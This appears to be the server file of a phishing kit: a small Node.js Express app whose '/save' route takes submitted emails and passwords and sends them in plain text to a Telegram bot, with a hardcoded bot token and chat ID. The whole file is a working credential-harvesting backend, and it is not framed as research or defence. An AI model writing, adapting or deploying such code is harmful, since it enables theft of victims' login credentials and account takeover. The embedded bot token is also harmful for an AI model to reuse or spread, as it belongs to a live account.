const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const fetch = require("node-fetch");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from public
app.use(express.static("public"));

// POST route for login
app.post("/save", async (req,res)=>{
  let email = req.body.email;
  let password = req.body.password;

  let botToken = "8594488382:AAHLeuQBRU7oZCq2QOWmrvKX-jtgwrwxNN0";
  let chatID = "7905175526";

  let message = `📧 Email: ${email}\n🔑 Password: ${password}`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({chat_id: chatID, text: message})
  });

  res.redirect("/"); // go back to index.html
});

// ✅ Serve index.html on root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));
